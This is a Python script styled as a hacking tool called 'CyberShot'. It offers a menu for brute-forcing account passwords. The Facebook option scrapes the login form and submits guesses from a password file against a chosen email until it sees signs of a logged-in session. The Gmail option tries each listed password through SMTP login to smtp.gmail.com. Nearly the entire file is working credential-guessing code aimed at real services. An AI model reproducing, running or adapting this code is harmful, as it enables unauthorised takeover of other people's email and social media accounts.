import os.path
import requests
from bs4 import BeautifulSoup
import sys


class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


print(style.YELLOW + """
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 _______           ______   _______  _______  _______           _______ _________
(  ____ \|\     /|(  ___ \ (  ____ \(  ____ )(  ____ \|\     /|(  ___  )\__   __/
| (    \/( \   / )| (   ) )| (    \/| (    )|| (    \/| )   ( || (   ) |   ) (   
| |       \ (_) / | (__/ / | (__    | (____)|| (_____ | (___) || |   | |   | |   
| |        \   /  |  __ (  |  __)   |     __)(_____  )|  ___  || |   | |   | |   
| |         ) (   | (  \ \ | (      | (\ (         ) || (   ) || |   | |   | |   
| (____/\   | |   | )___) )| (____/\| ) \ \__/\____) || )   ( || (___) |   | |   
(_______/   \_/   |/ \___/ (_______/|/   \__/\_______)|/     \|(_______)   )_(   
                                                                                  
                                                                               

                                                                            \033[34m    [1]Facebook brute force attack
                                                                                [2]Gmail brute force attack
                                                                                            
                                                                                    
""")

n = int(input(style.RED +"enter your namber:>>"))
if n == 1:
    print(style.BLUE +"""
    

 _______  _______         _______  ______  
(  ____ \(  ____ \       (  ____ \(  ___ \ 
| (    \/| (    \/       | (    \/| (   ) )
| |      | (_____  _____ | (__    | (__/ / 
| |      (_____  )(_____)|  __)   |  __ (  
| |            ) |       | (      | (  \ \ 
| (____/\/\____) |       | )      | )___) )
(_______/\_______)       |/       |/ \___/ 
                                                                                                    
                                            [+]Auther: Cyber Shot
                                            [+]Coding :Riyad hasan
    """)
    if sys.version_info[0] != 3:
        print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
        fb.py\n\t--------------------------------------''')
        sys.exit()
    PASSWORD= "passwords.txt"
    MIN_PASSWORD_LENGTH = 6
    POST_URL = 'https://www.facebook.com/login.php'
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    }
    PAYLOAD = {}
    COOKIES = {}


    def create_form():
        form = dict()
        cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

        data = requests.get(POST_URL, headers=HEADERS)
        for i in data.cookies:
            cookies[i.name] = i.value
        data = BeautifulSoup(data.text, 'html.parser').form
        if data.input['name'] == 'lsd':
            form['lsd'] = data.input['value']
        return form, cookies


    def is_this_a_password(email, index, password):
        global PAYLOAD, COOKIES
        if index % 10 == 0:
            PAYLOAD, COOKIES = create_form()
            PAYLOAD['email'] = email
        PAYLOAD['pass'] = password
        r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
        if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
            open('temp', 'w').write(str(r.content))
            print('\npassword found is: ', password)
            return True
        return False


    if __name__ == "__main__":
        print('\n---------- Welcome To Facebook BruteForce ----------\n')
        if not os.path.isfile(PASSWORD):
            print("Password file is not exist: ", PASSWORD)
            sys.exit(0)
        password_data = open(PASSWORD, 'r').read().split("\n")
        print("Password file selected: ", PASSWORD)
        email = input('Enter Email/Username to target: ').strip()
        for index, password in zip(range(password_data.__len__()), password_data):
            password = password.strip()
            if len(password) < MIN_PASSWORD_LENGTH:
                continue
            print("Trying password [", index, "]: ", password)
            if is_this_a_password(email, index, password):
                break
if n == 2:
    import smtplib
    import sys
    from os import system


    def artwork():
        print("\n")
    print("""
    

 _______  _______         _______  _       
(  ____ \(  ____ \       (  ____ \( \      
| (    \/| (    \/       | (    \/| (      
| |      | (_____  _____ | |      | |      
| |      (_____  )(_____)| | ____ | |      
| |            ) |       | | \_  )| |      
| (____/\/\____) |       | (___) || (____/\
(_______/\_______)       (_______)(_______/
                                           

                                            [+]Auther: Cyber Shot
                                            [+]Coding :Riyad hasan                                       

                                       
           """)
    artwork()
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

    smtpserver.ehlo()
    smtpserver.starttls()

    user = input("Enter The Target Gmail Adress => ")

    print("\n")

    pwd = input("Enter '1' to use the inbuilt passwords list \nEnter '2' to Add a custom password list\n => ")

    if pwd == '1':
        passswfile = "passwords.txt"

    elif pwd == '2':
        print("\n")
        passswfile = input("Name The File Path (For Password List) => ")

    else:
        print("\n")
        print("Invalid input!")
        sys.exit(1)
    try:
        passswfile = open(passswfile, "r")

    except Exception as e:
        print(e)
        sys.exit(1)

    for password in passswfile:
        try:
            smtpserver.login(user, password)

            print("[+] Password Found %s" % password)
            break

        except smtplib.SMTPAuthenticationError:
            print("[!] Pasword Is Wrong. %s " % password)

